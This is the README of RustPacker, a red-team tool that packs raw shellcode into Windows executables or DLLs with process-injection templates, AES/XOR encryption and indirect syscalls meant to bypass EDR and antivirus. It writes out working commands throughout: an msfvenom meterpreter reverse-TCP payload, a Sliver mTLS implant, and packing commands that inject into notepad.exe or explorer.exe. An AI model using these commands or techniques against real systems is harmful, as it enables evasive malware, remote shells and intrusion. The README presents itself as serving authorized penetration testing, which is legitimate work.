<h1 align="center">
<br>
<img src=img/logo_craiyon.png height="400" border="2px solid #555">
<br>
</h1>

## 🎯 Overview

RustPacker is a template-based shellcode packer designed for penetration testers and red team operators. It converts raw shellcode into Windows executables or DLLs using various injection techniques and evasion methods.

### ✨ Key Features

- **Multiple Injection Templates**: Choose from various injection techniques (CRT, APC, Fibers, etc.)
- **Encryption Support**: XOR and AES encryption for payload obfuscation
- **Syscall Evasion**: Indirect syscalls to bypass EDR/AV detection
- **Flexible Output**: Generate both EXE and DLL files
- **Cross-Platform**: Works on any OS with Docker/Podman support
- **Framework Compatible**: Works with Metasploit, Sliver, and custom shellcode

## 🚀 Quick Start

### Using Docker/Podman (Recommended)

```bash
# Clone the repository
git clone https://github.com/Nariod/RustPacker.git
cd RustPacker/

# Build the container (recommended: use Podman for security)
podman build -t rustpacker -f Dockerfile

# Place your shellcode file in the shared folder
cp your_shellcode.raw shared/

# Pack your shellcode
podman run --rm -v $(pwd)/shared:/usr/src/RustPacker/shared:z rustpacker RustPacker \
  -f shared/your_shellcode.raw \
  -i ntcrt \
  -e aes \
  -b exe \
  -t notepad.exe

# Find your packed binary in shared/output_[RANDOM_NAME]/target/x86_64-pc-windows-gnu/release/
```

### Create an Alias for Convenience

```bash
# Linux/macOS
alias rustpacker='podman run --rm -v $(pwd)/shared:/usr/src/RustPacker/shared:z rustpacker RustPacker'

# Now you can use it simply:
rustpacker -f shared/payload.raw -i syscrt -e aes -b exe -t explorer.exe
```

## 📋 Usage Examples

### Generate Shellcode

**Metasploit (msfvenom):**
```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.1.100 LPORT=4444 EXITFUNC=thread -f raw -o payload.raw
```

**Sliver:**
```bash
# In Sliver console
generate --mtls 192.168.1.100:443 --format shellcode --os windows --evasion
```

### Packing Examples

**Basic EXE with AES encryption:**
```bash
rustpacker -f shared/payload.raw -i ntcrt -e aes -b exe -t notepad.exe
```

**DLL with XOR encryption:**
```bash
rustpacker -f shared/payload.raw -i ntapc -e xor -b dll
```

**Custom output location:**
```bash
rustpacker -f shared/payload.raw -i syscrt -e aes -b exe -o shared/custom_name.exe
```

## 🛠️ Available Templates

| Template | Description | Injection Method | Syscalls |
|----------|-------------|------------------|----------|
| `wincrt` | High-level Windows API injection | Remote Process | ❌ |
| `ntcrt` | Low-level NT API injection | Remote Process | ❌ |
| `syscrt` | Indirect syscalls injection | Remote Process | ✅ |
| `ntapc` | APC-based execution | New Process | ❌ |
| `winfiber` | Fiber-based execution | Current Process | ❌ |
| `ntfiber` | NT API + Fiber execution | Current Process | ❌ |
| `sysfiber` | Indirect syscalls + Fiber execution | Current Process | ✅ |

### Template Details

**Process Injection Templates:**
- Use with `-t <process_name>` to specify target process
- Default target: `dllhost.exe`
- Compatible with: `wincrt`, `ntcrt`, `syscrt`

**Self-Execution Templates:**
- Execute shellcode within the packed binary
- Compatible with: `ntapc`, `winfiber`, `ntfiber`, `sysfiber`

## ⚙️ Local Installation

### Prerequisites

```bash
# Ubuntu/Debian
sudo apt update && sudo apt upgrade -y
sudo apt install -y libssl-dev librust-openssl-dev musl-tools mingw-w64 cmake libxml2-dev

# Install Rust
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
source $HOME/.cargo/env
rustup target add x86_64-pc-windows-gnu
```

### Build and Run

```bash
git clone https://github.com/Nariod/RustPacker.git
cd RustPacker/
cargo run -- -f shared/payload.raw -i ntcrt -e xor -b exe -t explorer.exe
```

## 📖 Command Line Options

```
RustPacker [OPTIONS]

OPTIONS:
    -f, --file <FILE>           Input shellcode file (raw format)
    -i, --injection <TEMPLATE>  Injection template [wincrt|ntcrt|syscrt|ntapc|winfiber|ntfiber|sysfiber]
    -e, --encryption <TYPE>     Encryption method [xor|aes]
    -b, --binary <TYPE>         Output binary type [exe|dll]
    -t, --target <PROCESS>      Target process name (for injection templates)
    -o, --output <PATH>         Custom output path and filename
    -h, --help                  Print help information
    -V, --version               Print version information
```

## 🔒 Detection Evasion

RustPacker implements several evasion techniques:

- **Indirect Syscalls**: Bypass user-mode hooks (syscrt, sysfiber templates)
- **Encryption**: XOR and AES payload encryption
- **Process Injection**: Hide execution in legitimate processes
- **Template Variety**: Multiple execution methods to avoid signatures
- **Rust Compilation**: Native binaries with reduced detection surface

## 🐳 Why Podman over Docker?

We recommend using Podman instead of Docker for [security reasons](https://cloudnweb.dev/2019/10/heres-why-podman-is-more-secured-than-docker-devsecops/):
- Rootless containers by default
- No daemon running as root
- Better security isolation

## 🤝 Contributing

Contributions are welcome! Here's how you can help:

1. **Code Review**: Review the codebase for improvements
2. **Issues**: Report bugs or request features
3. **Templates**: Contribute new injection techniques
4. **Documentation**: Improve documentation and examples

### Development Roadmap

- [x] Multiple injection templates
- [x] XOR and AES encryption
- [x] Indirect syscalls support
- [x] EXE and DLL output formats
- [x] Docker containerization
- [ ] String encryption (litcrypt)
- [ ] Sandbox evasion techniques
- [ ] Binary signing support
- [ ] Mutex/Semaphore support

## 🙏 Acknowledgments

- [memN0ps](https://github.com/memN0ps) - Inspiration and guidance
- [rust-syscalls](https://github.com/janoglezcampos/rust_syscalls) - Syscall implementation
- [trickster0](https://github.com/trickster0) - OffensiveRust repository
- [Maldev Academy](https://maldevacademy.com/) - Fiber execution techniques
- [craiyon](https://www.craiyon.com/) - Logo generation

## 📄 License & Legal Notice

**⚠️ IMPORTANT DISCLAIMER ⚠️**

This tool is provided for **educational and authorized penetration testing purposes only**. 

- Usage against targets without prior mutual consent is **illegal**
- Users are responsible for complying with all applicable laws
- Developers assume no liability for misuse or damages
- Only use in authorized environments with proper permission

**Use responsibly and ethically.**

---

<div align="center">

**Made with ❤️ for the cybersecurity community**

[Report Issues](https://github.com/Nariod/RustPacker/issues) • [Contribute](https://github.com/Nariod/RustPacker/pulls) • [Documentation](https://github.com/Nariod/RustPacker/wiki)

</div>